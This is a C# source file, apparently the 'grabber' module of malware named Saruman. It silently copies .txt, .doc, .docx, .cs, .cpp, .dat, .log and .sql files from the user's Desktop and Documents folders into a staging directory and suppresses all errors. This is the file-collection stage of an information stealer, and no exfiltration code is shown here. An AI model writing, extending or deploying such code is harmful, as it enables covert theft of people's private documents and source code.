using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Saruman.Utilies
{
    class grabber
    {
        public static void grab_desktop(string dir)
 	{ 
 		try 
		{ 
			foreach (FileInfo fileInfo in new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Desktop)).GetFiles()) 
 			{ 
				if (!(fileInfo.Extension != ".txt") || !(fileInfo.Extension != ".doc") || !(fileInfo.Extension != ".cs") || !(fileInfo.Extension != ".cpp") || !(fileInfo.Extension != ".dat") || !(fileInfo.Extension != ".docx") || !(fileInfo.Extension != ".log") || !(fileInfo.Extension != ".sql")) 
				{ 
					Directory.CreateDirectory(dir + "\\Files\\"); 
					fileInfo.CopyTo(dir + "\\Files\\" + fileInfo.Name); 
				} 
			}
                foreach (FileInfo fileInfo in new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)).GetFiles())
                {
                    if (!(fileInfo.Extension != ".txt") || !(fileInfo.Extension != ".doc") || !(fileInfo.Extension != ".cs") || !(fileInfo.Extension != ".cpp") || !(fileInfo.Extension != ".dat") || !(fileInfo.Extension != ".docx") || !(fileInfo.Extension != ".log") || !(fileInfo.Extension != ".sql"))
                    {
                        if (!Directory.Exists(dir + "\\files"))
                        {
                           
                            Directory.CreateDirectory(dir + "\\Files\\");
                        }
                        fileInfo.CopyTo(dir + "\\Files\\" + fileInfo.Name);
                    }
                }
               

            } 
		catch (Exception ex) 
		{ 
 		
 		} 
 	} 

    }
}
